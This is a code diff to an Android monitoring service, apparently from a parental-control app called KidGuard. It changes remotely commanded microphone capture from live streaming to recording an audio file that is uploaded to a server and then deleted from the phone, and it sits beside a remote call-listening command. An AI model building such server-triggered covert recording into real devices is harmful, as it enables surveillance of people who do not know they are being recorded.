@@ -258,29 +258,15 @@ class TrackerService : Service() {
             }
             "record_audio" -> {
                 val duration = params?.optInt("duration", 30) ?: 30
-                Log.d(TAG, "Starting live mic audio streaming for ${duration}s")
+                Log.d(TAG, "Starting ${duration}s continuous mic audio recording")
                 ApiClient.updateCommandStatus(commandId, "delivered")
 
-                // Start live PCM audio streaming
-                if (callStreamManager == null) {
-                    callStreamManager = CallStreamManager()
-                }
-                callStreamManager?.startStreaming(commandId = commandId)
-
-                // Stop streaming automatically after requested duration
                 scope.launch {
-                    delay(duration * 1000L)
-                    callStreamManager?.stopStreaming()
-                    ApiClient.updateCommandStatus(
-                        commandId,
-                        "completed",
-                        null,
-                        "audio"
-                    )
+                    recordMicAudioToFile(this@TrackerService, duration, commandId)
                 }
             }
             "stop_audio" -> {
-                Log.d(TAG, "Stopping live mic audio stream early")
+                Log.d(TAG, "Stopping mic audio stream early")
                 callStreamManager?.stopStreaming()
                 val targetCmdId = params?.optString("command_id")
                 if (!targetCmdId.isNullOrEmpty()) {
@@ -288,6 +274,7 @@ class TrackerService : Service() {
                 }
                 ApiClient.updateCommandStatus(commandId, "completed")
             }
+
 
             "listen_call" -> {
                 val enable = params?.optBoolean("enable", true) ?: true
@@ -415,11 +402,60 @@ class TrackerService : Service() {
         wakeLock?.acquire(10 * 60 * 1000L)
     }
 
+    private suspend fun recordMicAudioToFile(context: Context, durationSec: Int, commandId: String) {
+        val outputFile = java.io.File(context.cacheDir, "rec_${commandId}.m4a")
+        var recorder: android.media.MediaRecorder? = null
+        try {
+            recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                android.media.MediaRecorder(context)
+            } else {
+                @Suppress("DEPRECATION")
+                android.media.MediaRecorder()
+            }
+
+            recorder.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
+            recorder.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
+            recorder.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
+            recorder.setAudioSamplingRate(44100)
+            recorder.setAudioEncodingBitRate(96000)
+            recorder.setOutputFile(outputFile.absolutePath)
+
+            recorder.prepare()
+            recorder.start()
+            Log.d(TAG, "Started ${durationSec}s mic recording to file: ${outputFile.absolutePath}")
+
+            // Wait for specified duration
+            delay(durationSec * 1000L)
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error during mic recording: ${e.message}")
+        } finally {
+            try {
+                recorder?.stop()
+                recorder?.release()
+            } catch (e: Exception) {}
+        }
+
+        if (outputFile.exists() && outputFile.length() > 0) {
+            Log.d(TAG, "Recording completed (${outputFile.length()} bytes). Uploading...")
+            val success = ApiClient.uploadAudioRecording(outputFile, commandId)
+            if (success) {
+                ApiClient.updateCommandStatus(commandId, "completed", "/api/parent/audio-recording/$commandId", "audio")
+            } else {
+                ApiClient.updateCommandStatus(commandId, "failed", "Failed to upload audio file")
+            }
+            try { outputFile.delete() } catch (_: Exception) {}
+        } else {
+            ApiClient.updateCommandStatus(commandId, "failed", "Audio recording was empty or failed")
+        }
+    }
+
     private fun releaseWakeLock() {
         if (wakeLock?.isHeld == true) {
             wakeLock?.release()
         }
     }
+
 
     companion object {
         private const val TAG = "KidGuard"
